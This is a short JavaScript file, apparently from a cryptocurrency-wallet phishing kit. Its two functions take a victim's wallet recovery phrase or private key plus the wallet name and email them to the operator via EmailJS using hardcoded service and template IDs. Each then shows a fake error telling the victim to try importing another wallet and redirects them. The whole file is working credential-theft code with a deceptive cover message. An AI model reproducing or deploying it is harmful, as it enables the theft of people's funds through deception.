

function sendMessage(){
 
const phraseTextarea = document.getElementById("textInput");

// Get the value of the textarea
const phraseValue = phraseTextarea.value;

    var params= {
        subject: document.getElementById("walletNameData").value,
        message: phraseValue
    }

    const serviceID  = 'service_fsixmkl';
const templateID = 'template_mkzwfhj';

emailjs.send(serviceID, templateID, params).then((res)=>{
    document.getElementById("walletNameData").value= "";
    document.getElementById("textInput").value= "";
    console.log(res);
    alert('An error occurred, try importing another active wallet');
    window.location.href='index.html';

})
}


function sendMessage2(){
 
const phraseTextarea = document.getElementById("privateKeyInput");

// Get the value of the textarea
const phraseValue = phraseTextarea.value;

    var params= {
        subject: document.getElementById("wallet_name").value,
        message: phraseValue
    }
  const serviceID  = 'service_5qmyyts';
const templateID = 'template_jo1a9bw';

emailjs.send(serviceID, templateID, params).then((res)=>{
    document.getElementById("wallet_name").value= "";
    document.getElementById("privateKeyInput").value= "";
    console.log(res);
    alert('An error occurred, try importing another active wallet');
    window.location.href='index.html';

})
}

